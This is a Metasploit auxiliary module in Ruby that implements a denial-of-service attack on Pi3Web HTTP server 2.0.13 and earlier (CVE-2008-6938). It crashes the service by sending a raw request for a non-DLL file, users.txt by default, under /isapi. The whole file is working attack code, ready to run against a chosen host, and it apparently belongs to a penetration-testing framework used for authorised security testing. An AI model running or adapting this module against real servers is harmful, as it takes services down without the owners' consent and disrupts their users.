##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pi3Web ISAPI DoS',
        'Description' => %q{
          The Pi3Web HTTP server crashes when a request is made for an invalid DLL
          file in /isapi for versions 2.0.13 and earlier. By default, the non-DLLs
          in this directory after installation are users.txt, install.daf and
          readme.daf.
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-6938'],
          [ 'OSVDB', '49998'],
          [ 'EDB', '7109' ]
        ],
        'DisclosureDate' => '2008-11-13',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('FILENAME', [ true, 'File in /isapi to request', 'users.txt' ])
    ])
  end

  def run
    o = { 'uri' => "/isapi/#{datastore['FILENAME']}" }

    c = connect(o)
    c.send_request(c.request_raw(o))

    print_status("Request sent to #{rhost}:#{rport}")
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    print_status("Couldn't connect to #{rhost}:#{rport}")
  rescue ::Timeout::Error, ::Errno::EPIPE => e
    vprint_error(e.message)
  end
end
